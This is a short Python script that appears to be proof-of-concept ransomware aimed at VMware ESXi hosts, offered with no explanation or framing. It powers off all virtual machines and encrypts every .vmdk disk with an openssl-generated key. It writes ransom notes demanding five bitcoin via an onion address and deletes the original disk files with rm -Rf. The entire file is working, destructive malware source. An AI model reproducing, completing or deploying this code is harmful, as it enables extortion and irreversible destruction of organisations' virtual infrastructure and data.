import os
#Find and power off VMs
if not (os.path.isfile('vm.txt')):
    os.system("vim-cmd vmsvc/getallvms | awk '$1 ~ /^[0-9]+$/ {print $1}' > vm.txt")
    try:
       with open('vm.txt') as z:
         lines = z.readlines()

         for line in lines:
             cmd = ("vim-cmd vmsvc/power.off" + " " +(line))
             os.system(cmd)
    except:
         print ("VMs are not powered off")
#Make Key
os.system("openssl rand -base64 1024 > key.bin")
#Find VMDK Files
os.system("find  /vmfs/ | grep .vmdk > vmdk.txt")
#Loop through and encrypt VMs Write Ransom Note
with open('vmdk.txt') as z:
  lines = z.readlines()
  for line in lines:
    base = os.path.dirname(os.path.abspath(line))
    file = os.path.abspath((line))
    file = file.strip()
    newfile = base = os.path.splitext(line)[0]
    readme1 = ("echo README >" +(base)+" -ransom.txt")
    readme2 = ("echo We have encrypted all your VMs >>" +(base)+ "-ransom.txt")
    readme3 = ("echo To decrypt them you will need to pay five bitcoin >>"+(base)+"-ransom.txt")
    readme4 = ("echo Go here for instructions blah.onion >>"+(base)+"-ransom.txt")
    os.system(readme1)
    os.system(readme2)
    os.system(readme3)
    os.system(readme4)
    cmd = ("openssl enc -aes-256-cbc -md sha256 -salt -in " + '"' + (file) +'"'+" -out " + '"' +(newfile) + ".crypt" + '"' + " -pass file:./key.bin")
    print(newfile)
    os.system(cmd)
#Loop through and delete original VMDK files
with open('vmdk.txt') as z:
   lines = z.readlines()
   for line in lines:
    base = os.path.dirname(os.path.abspath(line))
    cmd = "rm -Rf "+(base)+"/*.vmdk"
    print(cmd)
    os.system(cmd)